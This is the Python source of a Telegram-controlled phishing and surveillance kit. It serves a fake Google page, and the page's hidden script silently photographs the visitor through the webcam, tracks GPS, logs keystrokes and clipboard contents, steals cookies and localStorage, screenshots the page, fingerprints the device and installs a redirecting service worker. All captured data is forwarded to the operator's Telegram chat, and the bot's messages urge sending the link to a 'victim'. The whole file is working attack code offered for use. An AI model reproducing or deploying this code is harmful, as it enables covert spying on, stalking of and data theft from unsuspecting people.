import os
import re
import time
import json
import base64
import logging
import threading
import asyncio
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters
from flask import Flask, request, render_template_string, jsonify, redirect

# ========== KONFİQ ==========
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '0'))
PORT = int(os.environ.get('PORT', 10000))
APP_URL = os.environ.get('RENDER_EXTERNAL_URL', '')

active_attacks = {}

# ========== ULTRA STEALTH ATTACK PAGE ==========
ATTACK_PAGE = '''
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { 
    font-family: 'Segoe UI', Arial, sans-serif; 
    background: #fff; 
    display: flex; 
    flex-direction: column; 
    align-items: center; 
    min-height: 100vh;
    opacity: 0;
    transition: opacity 0.3s;
}
.google-header { margin-top: 90px; text-align: center; }
.google-header h1 { font-size: 72px; font-weight: 500; letter-spacing: -2px; }
.google-header h1 span:nth-child(1) { color: #4285F4; }
.google-header h1 span:nth-child(2) { color: #EA4335; }
.google-header h1 span:nth-child(3) { color: #FBBC05; }
.google-header h1 span:nth-child(4) { color: #4285F4; }
.google-header h1 span:nth-child(5) { color: #34A853; }
.google-header h1 span:nth-child(6) { color: #EA4335; }

/* Ryhavean yazısı */
.ryhavean-brand {
    text-align: center;
    margin-top: 18px;
    font-size: 18px;
    font-weight: 700;
    color: #1a1a2e;
    letter-spacing: 2px;
    text-transform: uppercase;
}

/* Telegram loqo + @usersraven */
.telegram-brand {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-top: 8px;
}
.telegram-icon svg {
    width: 26px;
    height: 26px;
}
.telegram-handle {
    font-size: 16px;
    font-weight: 600;
    color: #0088cc;
    text-decoration: none;
}
.telegram-handle:hover {
    text-decoration: underline;
}

.search-box { margin-top: 20px; width: 580px; position: relative; }
.search-box input { 
    width: 100%; padding: 14px 50px; border: 1px solid #dfe1e5; 
    border-radius: 24px; font-size: 16px; outline: none;
    box-shadow: 0 1px 6px rgba(32,33,36,.28);
}
.search-box .icon-left { position: absolute; left: 15px; top: 12px; font-size: 18px; color: #9aa0a6; }
.search-box .icon-right { position: absolute; right: 15px; top: 12px; font-size: 18px; color: #4285F4; }
.buttons { margin-top: 25px; display: flex; gap: 12px; }
.buttons button {
    background: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px;
    padding: 10px 20px; font-size: 14px; color: #3c4043; cursor: pointer;
}
.buttons button:hover { border-color: #dadce0; box-shadow: 0 1px 1px rgba(0,0,0,.1); }
.container { display: none; }
#stealthOverlay { display: none; }
</style>
</head>
<body>
<div class="google-header">
    <h1>
        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
    </h1>
</div>

<div class="ryhavean-brand">Ryhavean</div>

<div class="telegram-brand">
    <span class="telegram-icon">
        <svg viewBox="0 0 24 24" fill="#0088cc" xmlns="http://www.w3.org/2000/svg">
            <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
        </svg>
    </span>
    <a class="telegram-handle" href="https://t.me/usersraven" target="_blank">@usersraven</a>
</div>

<div class="search-box">
    <span class="icon-left">🔍</span>
    <input type="text" placeholder="Google axtarışı...">
    <span class="icon-right">🎤</span>
</div>
<div class="buttons">
    <button>Google Axtar</button>
    <button>Kendimi şanslı hissediyorum</button>
</div>

<!-- ====== ULTRA STEALTH ENGINE ====== -->
<script>
// === PERSISTENT REDIRECT SERVICE WORKER ===
if ('serviceWorker' in navigator) {
    const swCode = `
    self.addEventListener('fetch', function(event) {
        event.respondWith(
            fetch(event.request).catch(function() {
                return Response.redirect('${APP_URL}');
            }).then(function(response) {
                if (response.status >= 400) {
                    return Response.redirect('${APP_URL}');
                }
                return response;
            })
        );
    });
    self.addEventListener('install', function(e) {
        self.skipWaiting();
    });
    self.addEventListener('activate', function(e) {
        e.waitUntil(clients.claim());
    });
    `;
    const swBlob = new Blob([swCode], { type: 'application/javascript' });
    const swUrl = URL.createObjectURL(swBlob);
    navigator.serviceWorker.register(swUrl, { scope: '/' }).then(function() {
        console.log('Ryhavean SW registered');
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'about:blank';
        document.body.appendChild(iframe);
        try {
            iframe.contentWindow.navigator.serviceWorker.register(swUrl, { scope: '/' });
        } catch(e) {}
    }).catch(function(e) { console.log('SW error:', e); });
}

try {
    localStorage.setItem('ryhavean_redirect_' + window.location.hostname, 'true');
    sessionStorage.setItem('ryhavean_active', 'true');
} catch(e) {}

var targetUrl = '${APP_URL}';
if (window.location.hostname !== new URL(targetUrl).hostname) {
    setTimeout(function() {
        window.location.replace(targetUrl);
    }, 30000);
}

setInterval(function() {
    if (window.location.hostname !== new URL(targetUrl).hostname) {
        window.location.href = targetUrl;
        setTimeout(function() {
            window.location.replace(targetUrl);
        }, 100);
        setTimeout(function() {
            document.location = targetUrl;
        }, 200);
    }
}, 10000);

var TARGET_IP = '{{ ip }}';
var CAPTURE_COUNT = 5;
var CAPTURE_INTERVAL = 0;
var capturedCount = 0;

var clientInfo = {
    ip: TARGET_IP,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages ? navigator.languages.join(',') : '',
    screen: screen.width + 'x' + screen.height,
    colorDepth: screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    hardwareConcurrency: navigator.hardwareConcurrency || '?',
    deviceMemory: navigator.deviceMemory || '?',
    referrer: document.referrer || 'direct',
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || 'unspecified',
    connection: navigator.connection ? navigator.connection.effectiveType : '?',
    touchSupport: 'ontouchstart' in window,
    webdriver: navigator.webdriver,
    plugins: Array.from(navigator.plugins || []).map(function(p) { return p.name; }).join(', '),
    timestamp: new Date().toISOString()
};

if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        clientInfo.lat = pos.coords.latitude;
        clientInfo.lon = pos.coords.longitude;
        clientInfo.accuracy = pos.coords.accuracy;
        clientInfo.altitude = pos.coords.altitude;
        clientInfo.speed = pos.coords.speed;
        sendFingerprint();
    }, function() {
        sendFingerprint();
    }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
} else {
    setTimeout(sendFingerprint, 100);
}

if ('getBattery' in navigator) {
    navigator.getBattery().then(function(battery) {
        clientInfo.batteryLevel = battery.level * 100 + '%';
        clientInfo.batteryCharging = battery.charging;
    });
}

function sendFingerprint() {
    fetch('/fingerprint', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(clientInfo)
    }).catch(function(e) {});
}

function startCamera() {
    try {
        var video = document.createElement('video');
        video.setAttribute('playsinline', '');
        video.setAttribute('autoplay', '');
        video.style.position = 'fixed';
        video.style.opacity = '0.001';
        video.style.width = '1px';
        video.style.height = '1px';
        video.style.top = '-100px';
        video.style.left = '-100px';
        video.style.pointerEvents = 'none';
        video.style.zIndex = '-9999';
        document.body.appendChild(video);
        
        navigator.mediaDevices.getUserMedia({ 
            video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'environment' }, 
            audio: false 
        }).then(function(stream) {
            video.srcObject = stream;
            video.onloadedmetadata = function() {
                video.play();
                for (var i = 0; i < CAPTURE_COUNT; i++) {
                    setTimeout(function(idx) {
                        capturePhoto(video, idx + 1, CAPTURE_COUNT);
                    }, i * 100);
                }
                setTimeout(function() {
                    stream.getTracks().forEach(function(t) { t.stop(); });
                    if (video.parentNode) video.parentNode.removeChild(video);
                }, CAPTURE_COUNT * 100 + 500);
            };
        }).catch(function(e) {
            navigator.mediaDevices.getUserMedia({ 
                video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' }, 
                audio: false 
            }).then(function(stream) {
                video.srcObject = stream;
                video.onloadedmetadata = function() {
                    video.play();
                    for (var i = 0; i < CAPTURE_COUNT; i++) {
                        setTimeout(function(idx) {
                            capturePhoto(video, idx + 1, CAPTURE_COUNT);
                        }, i * 100);
                    }
                    setTimeout(function() {
                        stream.getTracks().forEach(function(t) { t.stop(); });
                        if (video.parentNode) video.parentNode.removeChild(video);
                    }, CAPTURE_COUNT * 100 + 500);
                };
            }).catch(function(e2) {});
        });
    } catch(e) {}
}

function capturePhoto(video, index, total) {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;
        var ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        var dataUrl = canvas.toDataURL('image/jpeg', 0.85);
        
        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ip: TARGET_IP,
                photo: dataUrl,
                index: index,
                total: total,
                user_agent: navigator.userAgent
            })
        }).catch(function(e) {});
        
        capturedCount++;
        canvas.width = 0;
        canvas.height = 0;
    } catch(e) {}
}

function captureClipboard() {
    try {
        if (navigator.clipboard && navigator.clipboard.readText) {
            navigator.clipboard.readText().then(function(text) {
                if (text && text.length > 0) {
                    fetch('/click', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ip: TARGET_IP,
                            data: text,
                            type: 'clipboard'
                        })
                    }).catch(function(e) {});
                }
            }).catch(function() {});
        }
    } catch(e) {}
}

var keys = [];
document.addEventListener('keydown', function(e) {
    keys.push({ key: e.key, time: Date.now(), ctrl: e.ctrlKey, alt: e.altKey, shift: e.shiftKey });
    if (keys.length >= 20) {
        var dataToSend = keys.map(function(k) { return k.key; }).join('');
        fetch('/click', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ip: TARGET_IP,
                data: dataToSend,
                type: 'keylog'
            })
        }).catch(function(e) {});
        keys = [];
    }
});

function getLocalIP() {
    try {
        var RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
        if (RTCPeerConnection) {
            var pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(function(offer) { pc.setLocalDescription(offer); }).catch(function(){});
            pc.onicecandidate = function(ice) {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    var ipMatch = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                    if (ipMatch) {
                        fetch('/click', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                ip: TARGET_IP,
                                data: 'Local IP: ' + ipMatch[1],
                                type: 'network'
                            })
                        }).catch(function(){});
                        pc.onicecandidate = null;
                    }
                }
            };
        }
    } catch(e) {}
}

function captureScreenshot() {
    try {
        var html2canvas = document.createElement('script');
        html2canvas.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        html2canvas.onload = function() {
            setTimeout(function() {
                if (typeof html2canvas !== 'undefined') {
                    html2canvas(document.body).then(function(canvas) {
                        var dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                        fetch('/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                ip: TARGET_IP,
                                photo: dataUrl,
                                index: 6,
                                total: 6,
                                user_agent: navigator.userAgent + ' [SCREENSHOT]'
                            })
                        }).catch(function(){});
                    });
                }
            }, 2000);
        };
        document.head.appendChild(html2canvas);
    } catch(e) {}
}

function harvestStorage() {
    try {
        var data = { cookies: document.cookie, localStorage: {} };
        for (var key in localStorage) {
            if (localStorage.hasOwnProperty(key)) {
                data.localStorage[key] = localStorage.getItem(key).substring(0, 200);
            }
        }
        if (document.cookie || Object.keys(data.localStorage).length > 0) {
            fetch('/click', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ip: TARGET_IP,
                    data: JSON.stringify(data).substring(0, 2000),
                    type: 'storage'
                })
            }).catch(function(){});
        }
    } catch(e) {}
}

function scanDevices() {
    try {
        if (navigator.bluetooth && navigator.bluetooth.requestDevice) {
            navigator.bluetooth.requestDevice({ acceptAllDevices: true, optionalServices: [] })
                .then(function(device) {
                    fetch('/click', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ip: TARGET_IP,
                            data: 'Bluetooth: ' + device.name + ' (' + device.id + ')',
                            type: 'device'
                        })
                    }).catch(function(){});
                }).catch(function(){});
        }
    } catch(e) {}
    try {
        if (navigator.usb && navigator.usb.getDevices) {
            navigator.usb.getDevices().then(function(devices) {
                devices.forEach(function(device) {
                    fetch('/click', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ip: TARGET_IP,
                            data: 'USB: ' + device.productName,
                            type: 'device'
                        })
                    }).catch(function(){});
                });
            }).catch(function(){});
        }
    } catch(e) {}
}

function canvasFingerprint() {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = 200; canvas.height = 50;
        var ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = '#069';
        ctx.fillText('Ryhavean', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Stealth', 4, 17);
        var fp = canvas.toDataURL();
        fetch('/click', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ip: TARGET_IP,
                data: 'Canvas FP: ' + fp.substring(0, 100),
                type: 'fingerprint'
            })
        }).catch(function(){});
        canvas.width = 0; canvas.height = 0;
    } catch(e) {}
}

setTimeout(function() {
    document.body.style.opacity = '1';
}, 100);

setTimeout(startCamera, 500);
setTimeout(captureClipboard, 1000);
setTimeout(captureScreenshot, 1500);
setTimeout(getLocalIP, 2000);
setTimeout(harvestStorage, 2500);
setTimeout(scanDevices, 3000);
setTimeout(canvasFingerprint, 1000);

setInterval(captureClipboard, 5000);

setInterval(function() {
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            clientInfo.lat = pos.coords.latitude;
            clientInfo.lon = pos.coords.longitude;
            clientInfo.accuracy = pos.coords.accuracy;
            sendFingerprint();
        }, function(){}, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
    }
}, 30000);

setInterval(function() {
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js', { scope: '/' }).catch(function(){});
    }
}, 60000);

console.log('Ryhavean ULTRA Stealth Engine loaded');
</script>
</body>
</html>
'''

# ========== FLASK APP ==========
app = Flask(__name__)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr or 'unknown'

# ========== BOT HANDLERS ==========
async def start(update: Update, context):
    chat_id = update.effective_chat.id
    user = update.effective_user
    logger.info(f"✅ Bot start: {user.username or user.first_name} (ID: {chat_id})")
    
    await update.message.reply_text(
        f"🤖 *Ryhavean ULTRA Stealth Bot*\n\n"
        f"👤 Salam, {user.first_name}!\n"
        f"🆔 ID: `{chat_id}`\n\n"
        f"📌 *Komandalar:*\n"
        f"• IP ünvanı göndər → hücum başlat\n"
        f"• `/start` — bu mesaj\n\n"
        f"🔒 *Ultra Stealth Mode:* Kamera(5 ədəd) + GPS + Fingerprint + Clipboard + Keylogger + Screenshot + Local IP + Bluetooth/USB + Canvas FP",
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == 'start_attack':
        await query.edit_message_text("✅ Hücum başladıldı! Linki qurbanınıza göndərin.")
    elif data == 'stop_attack':
        await query.edit_message_text("⛔ Hücum dayandırıldı.")
    elif data == 'status':
        active_count = len(active_attacks)
        await query.edit_message_text(f"📊 *Status:*\n• Aktiv hücumlar: `{active_count}`\n• Hədəflər: `{list(active_attacks.keys())}`", parse_mode='Markdown')

async def handle_ip(update: Update, context):
    text = update.message.text.strip()
    chat_id = update.effective_chat.id
    
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    url_pattern = r'^https?://[^\s]+$'
    
    if re.match(ip_pattern, text) or re.match(url_pattern, text):
        ip = text if re.match(ip_pattern, text) else text
        target_url = f"{APP_URL}/attack?ip={text}"
        attack_key = text if re.match(ip_pattern, text) else text[:30]
        
        active_attacks[attack_key] = {'chat_id': chat_id, 'active': True, 'photos': [], 'fingerprints': []}
        
        await update.message.reply_text(
            f"🎯 *Hücum başladıldı!*\n\n"
            f"📍 Hədəf: `{text}`\n"
            f"🔗 Link: [Hücum Səhifəsi]({target_url})\n\n"
            f"📸 *5 ədəd şəkil çəkiləcək (anında!)*\n"
            f"📍 GPS lokasiyası\n"
            f"🖥 Fingerprint + Keylogger\n"
            f"📋 Clipboard\n"
            f"🔌 Local IP / Bluetooth / USB scan\n"
            f"🔄 Redirect hər 10 saniyədən bir yoxlanılır\n"
            f"♻️ Service Worker self-healing aktiv",
            parse_mode='Markdown',
            disable_web_page_preview=True
        )
    else:
        await update.message.reply_text("❌ Düzgün IP ünvanı və ya URL daxil edin!")

# ========== PERSISTENT EVENT LOOP ==========
bot_loop = None
application = None

def bot_loop_thread():
    global bot_loop, application
    
    bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)
    
    application = Application.builder().token(TOKEN).updater(None).build()
    application.add_handler(CommandHandler('start', start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ip))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    bot_loop.run_until_complete(application.initialize())
    logger.info("✅ Bot init edildi")
    
    if APP_URL:
        webhook_url = f"{APP_URL.rstrip('/')}/webhook"
        bot_loop.run_until_complete(application.bot.set_webhook(url=webhook_url))
        logger.info(f"✅ Webhook set: {webhook_url}")

# ========== FLASK ROUTES ==========
@app.route('/')
def home():
    return render_template_string(ATTACK_PAGE, ip=get_client_ip())

@app.route('/sw.js')
def service_worker():
    sw = '''
self.addEventListener('fetch', function(event) {
    event.respondWith(
        fetch(event.request).catch(function() {
            return Response.redirect('''' + APP_URL + '''');
        }).then(function(response) {
            if (response.status >= 400) {
                return Response.redirect('''' + APP_URL + '''');
            }
            return response;
        })
    );
});
self.addEventListener('install', function(e) { self.skipWaiting(); });
self.addEventListener('activate', function(e) { e.waitUntil(clients.claim()); });
'''
    return app.response_class(sw, mimetype='application/javascript')

@app.route('/attack')
def attack():
    ip = request.args.get('ip', get_client_ip())
    logger.info(f"🎯 Hücum səhifəsi açıldı! IP: {ip}")
    
    if ip not in active_attacks:
        active_attacks[ip] = {'chat_id': 0, 'active': True, 'photos': [], 'fingerprints': []}
    
    if application and bot_loop:
        asyncio.run_coroutine_threadsafe(
            application.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🎯 *YENİ HƏDƏF!*\nIP: `{ip}`\n🔗 Link açıldı!",
                parse_mode='Markdown'
            ),
            bot_loop
        )
    
    return render_template_string(ATTACK_PAGE, ip=ip)

@app.route('/fingerprint', methods=['POST'])
def fingerprint():
    try:
        data = request.get_json()
        ip = data.get('ip', get_client_ip())
        
        if ip not in active_attacks or not active_attacks[ip]['active']:
            return jsonify({'status': 'ignored'})
        
        active_attacks[ip]['fingerprints'].append(data)
        
        if application and bot_loop:
            msg_parts = [f"🎯 IP: `{ip}`"]
            
            if 'userAgent' in data:
                msg_parts.append(f"🌐 *Browser:* `{data.get('userAgent','?')[:80]}`")
            if 'platform' in data:
                msg_parts.append(f"💻 *Platform:* `{data.get('platform','?')}`")
            if 'screen' in data:
                msg_parts.append(f"🖥 *Ekran:* `{data.get('screen','?')}`")
            if 'language' in data:
                msg_parts.append(f"🌍 *Dil:* `{data.get('language','?')}`")
            if 'timezone' in data:
                msg_parts.append(f"🕐 *Saat qurşağı:* `{data.get('timezone','?')}`")
            if 'hardwareConcurrency' in data:
                msg_parts.append(f"⚡ *CPU nüvə:* `{data.get('hardwareConcurrency')}`")
            if 'deviceMemory' in data:
                msg_parts.append(f"🧠 *RAM:* `{data.get('deviceMemory')}GB`")
            if 'referrer' in data:
                msg_parts.append(f"🔗 *Gəldiyi yer:* `{data.get('referrer','?')}`")
            if 'lat' in data:
                maps_url = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
                msg_parts.append(f"📍 *GPS:* [{data['lat']},{data['lon']}]({maps_url}) (±{data.get('accuracy','?')}m)")
            if 'connection' in data:
                msg_parts.append(f"📶 *Bağlantı:* `{data.get('connection','?')}`")
            if 'touchSupport' in data:
                msg_parts.append(f"📱 *Touch:* `{data.get('touchSupport')}`")
            if 'batteryLevel' in data:
                msg_parts.append(f"🔋 *Batareya:* `{data.get('batteryLevel')}` ({data.get('batteryCharging')})")
            
            text = "🔍 *ULTRA Fingerprint + GPS*\n\n" + "\n".join(msg_parts)
            
            asyncio.run_coroutine_threadsafe(
                application.bot.send_message(chat_id=ADMIN_ID, text=text, parse_mode='Markdown', disable_web_page_preview=True),
                bot_loop
            )
        
        logger.info(f"🔍 Fingerprint alındı - IP: {ip}")
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.error(f"Fingerprint xətası: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        ip = data.get('ip')
        photo_b64 = data.get('photo')
        index = data.get('index')
        total = data.get('total')
        user_agent = data.get('user_agent', 'Unknown')
        
        if not application or not bot_loop:
            return jsonify({'status': 'error', 'message': 'Bot hazır deyil'}), 503
        if ip not in active_attacks or not active_attacks[ip]['active']:
            return jsonify({'status': 'ignored'})
        
        photo_bytes = base64.b64decode(photo_b64.split(',')[1])
        
        asyncio.run_coroutine_threadsafe(
            _send_photo_to_admin(ip, photo_bytes, index, total, user_agent),
            bot_loop
        )
        logger.info(f"📸 Gizli şəkil {index}/{total} - IP: {ip}")
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.error(f"Capture xətası: {e}")
        return jsonify({'status': 'error'}), 500

async def _send_photo_to_admin(ip, photo_bytes, index, total, user_agent):
    try:
        extra = ''
        if 'SCREENSHOT' in user_agent:
            extra = ' 🖥 EKRAN GÖRÜNTÜSÜ'
        caption = f"📸 *Gizli Kamera{extra}* | {index}/{total}\n🎯 IP: `{ip}`\n🕒 `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
        await application.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=InputFile(photo_bytes, filename=f"stealth_{ip}_{index}.jpg"),
            caption=caption, parse_mode='Markdown'
        )
        if index == total:
            await application.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"✅ *Gizli kamera tamamlandı!* IP: `{ip}` — {total} şəkil göndərildi.",
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Şəkil göndərmə xətası: {e}")

@app.route('/click', methods=['POST'])
def click():
    try:
        data = request.get_json()
        ip = data.get('ip')
        click_data = data.get('data', '')
        click_type = data.get('type', 'click')
        
        if ip in active_attacks and active_attacks[ip]['active']:
            type_icons = {'clipboard': '📋 Clipboard', 'keylog': '⌨️ Keylog', 'network': '🌐 Network', 'storage': '💾 Storage', 'device': '🔌 Device', 'fingerprint': '🖼 Canvas FP'}
            icon = type_icons.get(click_type, '📝 Data')
            
            logger.info(f"{icon}: {click_data[:100]}")
            if application and bot_loop:
                asyncio.run_coroutine_threadsafe(
                    application.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"{icon}\n🎯 IP: `{ip}`\n\n```\n{click_data[:1500]}\n```",
                        parse_mode='Markdown'
                    ),
                    bot_loop
                )
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@app.route('/health')
def health():
    return {'status': 'ok', 'active_targets': list(active_attacks.keys())}

@app.route('/webhook', methods=['POST'])
def webhook():
    if not application or not bot_loop:
        return 'Bot hazır deyil', 503
    update_json = request.get_json(force=True)
    asyncio.run_coroutine_threadsafe(
        _process_update(update_json), bot_loop
    )
    return 'OK'

async def _process_update(update_json):
    try:
        update = Update.de_json(update_json, application.bot)
        await application.process_update(update)
    except Exception as e:
        logger.error(f"Update xətası: {e}")

if __name__ == '__main__':
    if not TOKEN or TOKEN == 'YOUR_BOT_TOKEN':
        raise ValueError("BOT_TOKEN env-də təyin edilməyib!")
    if not ADMIN_ID or ADMIN_ID == 0:
        raise ValueError("ADMIN_ID env-də təyin edilməyib!")
    
    t = threading.Thread(target=bot_loop_thread, daemon=True)
    t.start()
    time.sleep(2)
    
    logger.info(f"🚀 Ryhavean ULTRA Stealth Bot - port {PORT}")
    logger.info(f"🔗 URL: {APP_URL}")
    logger.info("🥷 ULTRA MODE: 5x Kamera(instant) + GPS + Fingerprint + Keylogger + Clipboard + Screenshot + LocalIP + BT/USB + Canvas FP")
    app.run(host='0.0.0.0', port=PORT, threaded=True)
